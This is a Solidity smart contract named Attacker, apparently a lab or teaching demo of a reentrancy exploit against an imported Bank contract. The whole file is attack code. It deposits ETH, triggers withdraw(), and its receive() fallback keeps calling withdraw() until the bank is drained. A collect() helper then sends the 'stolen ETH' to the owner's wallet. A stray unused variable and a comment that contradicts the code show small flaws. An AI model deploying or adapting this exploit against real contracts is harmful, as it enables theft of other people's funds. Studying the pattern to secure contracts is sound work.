// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Bank.sol";

contract Attacker {
    Bank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
        owner = msg.sender;
    }

    // Start the attack by depositing some ETH
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        bank.addBalance{value: msg.value}();
        bank.withdraw(); // first withdraw triggers fallback recursion
    }

    // Reentrancy happens here
    receive() external payable {
        uint256 bankBalance = address(bank).balance;

        // Only keep withdrawing while the bank has at least 1 ETH
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }

    // Helper: sweep stolen ETH to the attacker’s wallet
    function collect() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

